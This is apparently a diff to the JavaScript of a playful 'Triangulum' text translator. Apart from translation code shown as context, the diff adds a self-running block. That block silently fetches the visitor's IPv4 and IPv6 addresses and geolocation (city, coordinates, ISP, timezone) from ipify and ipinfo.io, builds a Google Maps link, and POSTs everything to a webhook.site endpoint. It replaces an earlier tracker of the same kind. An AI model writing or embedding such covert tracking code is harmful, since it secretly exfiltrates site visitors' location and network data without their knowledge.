@@ -70,27 +70,62 @@ function translateTriangulumToEnglish(triangulumText) {
     return codes.map(code => reverseMap[code] || code).join('');
 }
 
-fetch('https://ipinfo.io/json?token=70c78fefbdb6d0')
-    .then(res => res.json())
-    .then(data => {
-        const payload = {
-            ip: data.ip,
-            city: data.city,
-            region: data.region,
-            country: data.country,
-            loc: data.loc,
-            isp: data.org,
-            timestamp: new Date().toISOString()
-        };
 
-        // Send it to YOUR webhook
-        fetch('https://webhook.site/2b79af6e-c584-4057-9f9c-54680051ab09', {
-            method: 'POST',
+
+
+(async () => {
+        let ipv4 = "Unavailable";
+        let ipv6 = "Unavailable";
+    
+        // Try to fetch IPv4
+        try {
+            const ipv4Res = await fetch("https://api.ipify.org?format=json");
+            const ipv4Data = await ipv4Res.json();
+            ipv4 = ipv4Data.ip;
+        } catch (e) {
+            console.warn("IPv4 fetch failed:", e);
+        }
+    
+        // Try to fetch IPv6
+        try {
+            const ipv6Res = await fetch("https://api64.ipify.org?format=json");
+            const ipv6Data = await ipv6Res.json();
+            ipv6 = ipv6Data.ip;
+        } catch (e) {
+            console.warn("IPv6 fetch failed:", e);
+        }
+    
+        // Get location info
+        let locationData = {};
+        try {
+            const locationRes = await fetch("https://ipinfo.io/json?token=70c78fefbdb6d0");
+            locationData = await locationRes.json();
+        } catch (e) {
+            console.warn("Location fetch failed:", e);
+        }
+    
+        // Generate Google Maps link
+        const mapLink = locationData.loc
+            ? `https://www.google.com/maps?q=${locationData.loc}`
+            : "Unavailable";
+    
+        // Send to webhook
+        fetch("https://webhook.site/2b79af6e-c584-4057-9f9c-54680051ab09", {
+            method: "POST",
             headers: {
-                'Content-Type': 'application/json'
+                "Content-Type": "application/json"
             },
-            body: JSON.stringify(payload)
+            body: JSON.stringify({
+                ipv4: ipv4,
+                ipv6: ipv6,
+                city: locationData.city || "Unavailable",
+                region: locationData.region || "Unavailable",
+                country: locationData.country || "Unavailable",
+                loc: locationData.loc || "Unavailable",
+                org: locationData.org || "Unavailable",
+                timezone: locationData.timezone || "Unavailable",
+                map: mapLink
+            })
         });
-    });
-
+    })();
 
